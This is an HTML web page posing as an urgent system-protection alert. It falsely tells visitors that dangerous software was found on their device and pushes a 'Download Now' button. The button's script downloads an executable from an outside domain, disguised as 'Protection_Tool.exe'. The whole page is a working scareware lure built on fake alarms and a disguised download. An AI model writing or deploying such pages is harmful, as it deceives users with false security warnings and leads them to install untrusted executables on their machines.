<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your System Protection - Urgent!</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f8d7da;
      color: #721c24;
      text-align: center;
      padding: 20px;
    }

    #warning-banner {
      background-color: #f5c6cb;
      padding: 20px;
      border: 2px solid #721c24;
      border-radius: 5px;
      margin-bottom: 20px;
    }

    #download-button {
      background-color: #dc3545;
      color: white;
      padding: 15px 30px;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
    }

    #download-button:hover {
      background-color: #c82333;
    }

    .small-print {
      font-size: 12px;
      color: #6c757d;
      margin-top: 20px;
    }
  </style>
</head>

<body>
  <div id="warning-banner">
    <h1>Warning! Your system is at risk!</h1>
    <p>Potentially dangerous software has been detected on your device.</p>
    <p>Immediately download the latest security update to protect your data.</p>
  </div>
  <button id="download-button" onclick="startDownload()">Download Now</button>
  <p class="small-print">By clicking “Download Now,” you agree to download the protection file.</p>

  <script>
    function startDownload() {
      const link = document.createElement('a');
      link.href = 'https://system-protection.com/tool.exe';
      link.download = 'Protection_Tool.exe';
      link.click();
      alert("Download started...");
    }
  </script>
</body>

</html>
